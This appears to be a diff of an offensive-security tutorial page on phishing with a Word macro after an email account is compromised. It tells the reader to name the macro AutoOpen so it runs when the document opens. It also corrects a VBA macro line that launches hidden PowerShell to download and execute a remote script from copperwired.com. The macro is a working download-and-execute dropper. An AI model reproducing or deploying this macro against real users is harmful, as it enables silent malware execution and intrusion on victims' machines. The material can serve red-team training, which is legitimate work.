@@ -6,9 +6,21 @@ If we've compromised a users email we've opened a door to many possibilities. We
 
 Visual Basic for Applications (VBA) is commonly used to enhance functionality in Excel and Word.&#x20;
 
-### VBA Beacon Macro
+###
+
+## VBA Beacon Macro
+
+
+
+### Create Word Macro
 
 We can create a macro in word by going View -> Macros -> Create.&#x20;
+
+<mark style="color:red;">**Note**</mark>: Make sure to change the macro name to "AutoOpen" and set the "Macros in" to the current document (Document1).
+
+<figure><img src="../../../.gitbook/assets/Screenshot 2024-08-22 at 9.41.59 PM.png" alt=""><figcaption></figcaption></figure>
+
+### Create VBA Script
 
 ```vba
 Sub AutoOpen()
@@ -33,7 +45,7 @@ Sub AutoOpen()
 
   Dim Shell As Object
   Set Shell = CreateObject("wscript.shell")
-  Shell.Run Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://copperwired.com/a'))"""
+  Shell.Run  "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://copperwired.com/a'))"""
 
 End Sub
 ```
